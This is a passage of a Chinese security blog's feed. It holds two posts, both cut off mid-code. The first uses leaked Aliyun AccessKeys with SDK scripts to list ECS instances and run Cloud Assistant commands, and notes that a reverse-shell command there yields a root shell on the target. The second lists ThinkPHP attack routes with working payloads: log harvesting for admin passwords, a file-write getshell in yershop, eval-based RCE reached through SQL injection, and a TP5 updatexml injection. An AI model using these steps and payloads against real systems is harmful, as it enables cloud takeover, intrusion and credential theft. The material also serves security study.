class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                priip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'PrivateIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>            priip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                pubip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                pubip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            osname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insId <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span>        res <span class="token operator">=</span> <span class="token string">'主机名称:{}&lt;--->操作系统:{}&lt;--->内网IP:{}&lt;--->公网IP:{}&lt;--->网络@{}&lt;--->InstanceId:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>insname<span class="token punctuation">,</span> osname<span class="token punctuation">,</span>str<span class="token punctuation">(</span>priip<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>pubip<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>RegionId<span class="token punctuation">)</span><span class="token punctuation">,</span>insId<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/4.png" alt="" loading="lazy"></p><ol start="2"><li>使用CreateCommand新建一条云助手命令（CreateCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/5.png" alt="" loading="lazy"></p><p>RegionId代表区域；Name为命令名称，支持全字符集，长度不得超过128个字符；</p><p>Type为命令的类型：</p><pre><code>RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。 RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。 RunShellScript：创建一个在Linux实例中运行的Shell脚本。</code></pre><p>CommandContent为需要执行的命令，base64进行传输的，一般不超过16k</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>CreateCommandRequest <span class="token keyword">import</span> CreateCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxnxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> CreateCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Name<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Type<span class="token punctuation">(</span><span class="token string">"RunShellScript"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandContent<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'需要执行的命令'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行脚本输出</p><pre><code>{&quot;RequestId&quot;:&quot;C5A79885-6377-4785-86C6-9CA7FCXXXXX&quot;,&quot;CommandId&quot;:&quot;c-hz0xxxx&quot;}</code></pre><ol start="3"><li>利用DescribeCommands查询您已经创建的云助手命令（DescribeCommands.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/6.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeCommandsRequest <span class="token keyword">import</span> DescribeCommandsRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeCommandsRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0xxxxx"</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># python2:  print(response) </span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>利用InvokeCommand为一台或多台ECS实例触发一条云助手命令（InvokeCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/7.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果，InstanceId为需要执行命令的实例列表，就是上面第一个脚本获取到的InstanceId</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>InvokeCommandRequest <span class="token keyword">import</span> InvokeCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> InvokeCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0uxxxxx"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_InstanceIds<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"i-bp1xxxxxxx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只需要将CreateCommand.py脚本的命令换成反弹shell的命令，在利用InvokeCommand执行命令就可以反弹一个最高权限的shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>关于ThinkPHP的一些渗透方式</title>
    <link href="http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-16T16:00:00.000Z</published>
    <updated>2020-08-17T09:29:35.804Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Runtime日志"><a href="#Runtime日志" class="headerlink" title="Runtime日志"></a><strong>Runtime日志</strong></h4><p>在ThinkPHP3的版本中，入口文件index.php是跟应用目录，框架目录是同一个目录下的，在DEBUG开启的状态下，会在runtime生成日志文件，会泄露一些管理员登录后台的账号密码等。tp3的日志文件命名规则为：根目录(或者应用目录)/Runtime/Logs/Admin/20_08_17.log（年份前2位_月份_日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/1.png" alt="" loading="lazy"></p><p>在tp5的版本中，入口文件index是在public的目录下，它跟应用目录，框架目录不在同一个目录，但是有些管理员会将入口文件放置到跟应用目录，框架目录同目录，tp5的命名规则为：./runtime/log/202008/17.log（./runtime/log/年月/日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/2.png" alt="" loading="lazy"></p><h4 id="file-put-contents函数"><a href="#file-put-contents函数" class="headerlink" title="file_put_contents函数"></a><strong>file_put_contents函数</strong></h4><p>在thinkphp3中，后台有很多时候都会有写入配置文件来getshell的，所以我总是喜欢全局查找这个file_put_contents这个函数，然后我在网上找了个代码–yershop(TP3开发的那个版本)来进行审计，后台可以通过写入文件来拿shell。全局查找file_put_contents函数，发现控制器AddonsController.class.php中的build存在</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/4.png" alt="" loading="lazy"></p><p>发现存在两处写入文件，这里第一处需要满足以下条件：</p><pre><code>$addon_dir可控,$data可控,$addonModel可控</code></pre><p>第二处需要满足：</p><pre><code>$data[&#39;has_config&#39;] == 1,$addon_dir可控</code></pre><p>跟踪发现$data是从全局POST获取的，所有可控，即$addon_dir可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/5.png" alt="" loading="lazy"></p><p>构造payload如下，后台创建扩展</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/6.png" alt="" loading="lazy"></p><p>点击确定，抓包，首先会判断标识名这个插件是否存在，不存在就执行build访问</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/7.png" alt="" loading="lazy"></p><p>由于要写入config.php这个文件需要满足$data[‘has_config’] == 1，最后构造payload</p><p>访问：index.php?s=/Admin/Addons/build.html              POST发送：</p><pre><code>info%5Bname%5D=Example&amp;info%5Btitle%5D=%E7%A4%BA%E5%88%97&amp;info%5Bversion%5D=0.1&amp;info%5Bauthor%5D=%E6%97%A0%E5%90%8D&amp;info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B0&amp;info%5Bstatus%5D=1&amp;config=%3C%3Fphp%0D%0Areturn+array(%0D%0A%09&#39;random&#39;%3D%3Earray(%2F%2F%E9%85%8D%E7%BD%AE%E5%9C%A8%E8%A1%A8%E5%8D%95%E4%B8%AD%E7%9A%84%E9%94%AE%E5%90%8D+%2C%E8%BF%99%E4%B8%AA%E4%BC%9A%E6%98%AFconfig%5Brandom%5D%0D%0A%09%09&#39;title&#39;%3D%3E&#39;%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E9%9A%8F%E6%9C%BA%3A&#39;%2C%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E6%96%87%E5%AD%97%0D%0A%09%09&#39;type&#39;%3D%3E&#39;radio&#39;%2C%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%9Atext%E3%80%81textarea%E3%80%81checkbox%E3%80%81radio%E3%80%81select%E7%AD%89%0D%0A%09%09&#39;options&#39;%3D%3Earray(%09%09+%2F%2Fselect+%E5%92%8Cradion%E3%80%81checkbox%E7%9A%84%E5%AD%90%E9%80%89%E9%A1%B9%0D%0A%09%09%09&#39;1&#39;%3D%3E&#39;%E5%BC%80%E5%90%AF&#39;%2C%09%09+%2F%2F%E5%80%BC%3D%3E%E6%96%87%E5%AD%97%0D%0A%09%09%09&#39;0&#39;%3D%3E&#39;%E5%85%B3%E9%97%AD&#39;%2C%0D%0A%09%09)%2C%0D%0A%09%09&#39;value&#39;%3D%3E&#39;1&#39;%2C%09%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E9%BB%98%E8%AE%A4%E5%80%BC%0D%0A%09)%2C%0D%0A)%3B%0D%0A%09%09%09%09%09&amp;custom_config=&amp;admin_list=&#39;model&#39;%3D%3E&#39;Example&#39;%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09&#39;fields&#39;%3D%3E&#39;*&#39;%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09&#39;map&#39;%3D%3E&#39;&#39;%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%8F%AF%E4%BB%A5%E5%86%8D%E6%8F%92%E4%BB%B6%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E9%87%8C%E5%8A%A8%E6%80%81%E9%87%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%0D%0A%09%09%09&#39;order&#39;%3D%3E&#39;id+desc&#39;%2C%09%09%2F%2F%E6%8E%92%E5%BA%8F%2C%0D%0A%09%09%09&#39;list_grid&#39;%3D%3Earray(+%09%09%2F%2F%E8%BF%99%E9%87%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E6%98%AF%E9%99%A4%E4%BA%86id%E5%BA%8F%E5%8F%B7%E5%A4%96%E7%9A%84%E8%A1%A8%E6%A0%BC%E9%87%8C%E5%AD%97%E6%AE%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A8%E5%A4%B4%E5%90%8D%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%B8%80%E6%A0%B7%E6%94%AF%E6%8C%81%E5%87%BD%E6%95%B0%E5%92%8C%E9%93%BE%E6%8E%A5%0D%0A++++++++++++++++&#39;cover_id%7Cpreview_pic%3A%E5%B0%81%E9%9D%A2&#39;%2C%0D%0A++++++++++++++++&#39;title%3A%E4%B9%A6%E5%90%8D&#39;%2C%0D%0A++++++++++++++++&#39;description%3A%E6%8F%8F%E8%BF%B0&#39;%2C%0D%0A++++++++++++++++&#39;link_id%7Cget_link%3A%E5%A4%96%E9%93%BE&#39;%2C%0D%0A++++++++++++++++&#39;update_time%7Ctime_format%3A%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4&#39;%2C%0D%0A++++++++++++++++&#39;id%3A%E6%93%8D%E4%BD%9C%3A%5BEDIT%5D%7C%E7%BC%96%E8%BE%91%2C%5BDELETE%5D%7C%E5%88%A0%E9%99%A4&#39;%0D%0A++++++++++++)%2C%0D%0A%09%09%09%09%09&amp;custom_adminlist=&amp;has_config=1&amp;config=&lt;?php phpinfo();?&gt;</code></pre><p>成功写入config.php文件，访问Addons/Example/config.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/8.png" alt="" loading="lazy"></p><p>所以，在TP3开发的源码中，全局查找file_put_contents很容易中奖。</p><h4 id="Auth引发的RCE"><a href="#Auth引发的RCE" class="headerlink" title="Auth引发的RCE"></a><strong>Auth引发的RCE</strong></h4><p>在tp3中，在Auth的getAuthList方法存在eval函数，跟进代码ThinkPHP\Library\Think\Auth.class.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/7.png" alt="" loading="lazy"></p><p>这里需要满足$command变量可控就可以rce了，$command为[表前缀]_auth_rule的condition字段，这里我还是以yershop源码来分析，控制权限的表为yershop_auth_rule。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/8.png" alt="" loading="lazy"></p><p>所以，漏洞触发需要向condition字段写入我们的恶意代码，要利用注入且支持pdo就能写入进去，tp3是以pdo来连接数据库的，这里满足了pdo，就需要寻找注入点来getshell了。</p><p>在文件Application\Home\Controller\OrderController.class.php中的detail方法，通过<strong>I</strong>方法获取id参数。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/9.png" alt="" loading="lazy"></p><p>利用pdo修改condition字段</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/10.png" alt="" loading="lazy"></p><p>继续分析，是怎么调用到getAuthList这个方法的，在Application\Admin\Controller\AdminController.class.php控制器中，调用了checkRule方法，在checkRule方法实列了Auth类，并调用了check方法。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/11.png" alt="" loading="lazy"></p><p>跟进check方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/12.png" alt="" loading="lazy"></p><p>在104行调用了我们的getAuthList方法，执行到了eval函数处。要触发rce，从代码中可以看到需要普通用户的权限才会执行到checkRule方法，所以先添加一个新用户并新增一个用户组，给它文章管理的权限。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/13.png" alt="" loading="lazy"></p><p>登录这个用户，访问我们注入修改的路由，成功rce</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/14.png" alt="" loading="lazy"></p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>在TP3.1.3和TP3.2.3注入都差不多，无非就表达式注入，bind注入，find/select/delete注入，order注入，在之前的<a href="https://bbs.ichunqiu.com/thread-56035-1-1.html" target="_blank" rel="noopener">文章</a>中，分析过关于tp3.2.3的注入，这里我就不在多说了。这里主要是TP5的注入。</p><h5 id="ThinkPHP-lt-5-0-16-insert-update注入"><a href="#ThinkPHP-lt-5-0-16-insert-update注入" class="headerlink" title="ThinkPHP&lt;=5.0.16 insert/update注入"></a><strong>ThinkPHP&lt;=5.0.16 insert/update注入</strong></h5><p>在ThinkPHP5中，获取请求方式的方法是input，在控制器中，写个存在漏洞的demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'get.username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>漏洞payload</p><pre><code>username[0]=dec&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/17.png" alt="" loading="lazy"></p><p>在user变量处，断点进行分析，直接进入update方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/18.png" alt="" loading="lazy"></p><p>继续跟进$this-&gt;builder-&gt;update</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/19.png" alt="" loading="lazy"></p><p>在parseData方法中，进行了sql语句的拼接</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/20.png" alt="" loading="lazy"></p><p>当参数传入数组的时候，下标0为exp时候，直接返回下标为1的参数值，而为inc或者dec时候，通过parseKey方法处理了下标为1的参数值，跟进查看parseKey方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'$.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// JSON字段支持</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'$.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$key</span>                <span class="token operator">=</span> <span class="token string">'json_extract('</span> <span class="token punctuation">.</span> <span class="token variable">$field</span> <span class="token punctuation">.</span> <span class="token string">', \'$.'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'\')'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\(\)`\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'__TABLE__'</span> <span class="token operator">==</span> <span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\*\(\)`.\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token string">'`'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'`.`'</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token string">'`.'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>然而parseKey并没有对传入的字符进行任何过滤，所以当输入exp，inc，dec，都返回的字符串，为什么参数值为exp的时候不能产生注入，原因是在用input方法传入的时候，要经过filterExp进行过滤</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filterExp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token 